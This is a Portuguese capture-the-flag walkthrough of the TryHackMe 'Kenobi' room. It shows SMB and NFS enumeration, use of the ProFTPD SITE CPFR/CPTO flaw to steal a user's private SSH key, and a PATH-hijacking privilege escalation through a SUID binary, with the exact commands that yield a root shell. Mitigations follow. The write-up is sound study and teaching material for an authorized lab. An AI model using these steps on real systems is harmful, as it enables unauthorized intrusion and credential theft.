# TryHackMe — Kenobi

![Plataforma](https://img.shields.io/badge/TryHackMe-Kenobi-212C42?logo=tryhackme)
![Dificuldade](https://img.shields.io/badge/Dificuldade-Easy-brightgreen)
![SO](https://img.shields.io/badge/SO-Linux-yellow?logo=linux)

> Walkthrough da sala **Kenobi** (TryHackMe). O foco é a exploração de serviços de rede mal configurados em Linux — **Samba**, **FTP (ProFTPD)** e **NFS** — culminando em uma escalada de privilégio via **PATH hijacking** em um binário SUID.
>
> ⚠️ As flags foram omitidas de propósito. O objetivo aqui é documentar a **metodologia**, não entregar respostas.

---

## Índice

1. [Reconhecimento](#1-reconhecimento)
2. [Enumeração do Samba (SMB)](#2-enumeração-do-samba-smb)
3. [Enumeração do FTP (ProFTPD)](#3-enumeração-do-ftp-proftpd)
4. [Acesso inicial via NFS](#4-acesso-inicial-via-nfs)
5. [Escalada de privilégio (PATH hijacking)](#5-escalada-de-privilégio-path-hijacking)
6. [Resumo e lições aprendidas](#6-resumo-e-lições-aprendidas)

---

## 1. Reconhecimento

Scan completo de portas, para não deixar escapar nenhum serviço em porta incomum:

```bash
nmap -p- -T4 --min-rate=1000 <IP>
```

Em seguida, um scan detalhado (versões + scripts padrão) somente nas portas abertas:

```bash
nmap -sC -sV -p <portas_abertas> <IP>
```

**Serviços relevantes encontrados:**

| Porta | Serviço        | Observação                              |
|-------|----------------|-----------------------------------------|
| 21    | FTP (ProFTPD)  | Versão vulnerável                       |
| 22    | SSH            | Acesso por chave mais à frente          |
| 80    | HTTP           | Servidor web                            |
| 111   | RPCbind        | Portmapper do NFS                       |
| 139 / 445 | Samba (SMB) | Compartilhamentos de arquivos          |
| 2049  | NFS            | Sistema de arquivos de rede             |

---

## 2. Enumeração do Samba (SMB)

Os scripts de SMB do nmap podem não retornar nada sem autenticação, então o `smbclient` é mais direto para listar compartilhamentos com login anônimo:

```bash
smbclient -L //<IP>/ -N
```

Foi encontrado um compartilhamento **`anonymous`** acessível sem senha. Para conectar e navegar:

```bash
smbclient //<IP>/anonymous -N
```

Dentro do share, use `ls` para listar e `get <arquivo>` para baixar os arquivos para a máquina local. Entre os arquivos havia informação que indicava o uso do **ProFTPD** e a localização de uma chave SSH — pistas para os próximos passos.

---

## 3. Enumeração do FTP (ProFTPD)

Captura do banner do serviço (banner grabbing) com netcat, para descobrir a versão exata:

```bash
nc -nv <IP> 21
```

Com a versão em mãos, busca por exploits conhecidos no Exploit-DB local:

```bash
searchsploit proftpd <versão>
```

A versão em questão é afetada por uma vulnerabilidade de cópia de arquivos através dos comandos `SITE CPFR` / `SITE CPTO`, que permite mover arquivos do servidor sem autenticação — incluindo a **chave SSH privada** do usuário `kenobi` para um local acessível via NFS.

---

## 4. Acesso inicial via NFS

O NFS exportava o diretório `/var` sem restrições. Verificando os exports:

```bash
showmount -e <IP>
```

Montagem do compartilhamento localmente:

```bash
sudo mkdir /mnt/kenobiNFS
sudo mount <IP>:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS/
```

A chave SSH privada (movida via a falha do ProFTPD para `/var/tmp`) ficou acessível. Copiando e ajustando as permissões (o SSH recusa chaves com permissão aberta):

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@<IP>
```

Com acesso como usuário **`kenobi`**, a primeira flag está em `/home/kenobi/user.txt`.

---

## 5. Escalada de privilégio (PATH hijacking)

Busca por binários com o bit **SUID** (executam com privilégio do dono — normalmente root):

```bash
find / -perm -u=s -type f 2>/dev/null
```

Destaque para um binário fora do padrão: **`/usr/bin/menu`**. Inspecionando seu conteúdo:

```bash
strings /usr/bin/menu
```

Descobre-se que ele executa comandos do sistema (como `curl`) **sem o caminho absoluto**. Essa é a falha: o sistema procura o comando nas pastas da variável `PATH`, em ordem. Criando um `curl` falso em uma pasta que vem antes no `PATH`, o binário SUID executa o nosso código **como root**.

```bash
# 1. Cria um "curl" falso que abre um shell
echo '/bin/sh' > /tmp/curl
chmod 777 /tmp/curl

# 2. Coloca /tmp no início do PATH
export PATH=/tmp:$PATH

# 3. Executa o binário vulnerável e escolhe a opção que chama o curl
/usr/bin/menu
```

Resultado: shell como **root**. A flag final está em `/root/root.txt`.

```bash
id        # confirma uid=0(root)
```

---

## 6. Resumo e lições aprendidas

| Etapa | Técnica | Ferramenta |
|-------|---------|------------|
| Recon | Scan completo de portas e versões | `nmap` |
| Enumeração SMB | Listagem de shares com login anônimo | `smbclient` |
| Enumeração FTP | Banner grabbing + busca de exploit | `netcat`, `searchsploit` |
| Acesso inicial | Leitura de `/var` via NFS, roubo de chave SSH | `mount`, `ssh` |
| Privesc | PATH hijacking em binário SUID | `find`, `strings` |

**Falhas de configuração exploradas:**

- Compartilhamento Samba acessível sem autenticação.
- NFS exportando `/var` sem restrição de IP.
- Versão vulnerável do ProFTPD exposta.
- Binário SUID chamando comandos sem caminho absoluto.

**Como mitigar:**

- Nunca deixar chaves ou credenciais em diretórios acessíveis publicamente.
- Restringir exports NFS por IP e ao mínimo necessário.
- Manter serviços atualizados (ProFTPD).
- Em binários SUID, sempre usar o **caminho absoluto** dos comandos (`/usr/bin/curl` em vez de `curl`).

---

*Writeup de estudo — praticado em ambiente autorizado (TryHackMe).*
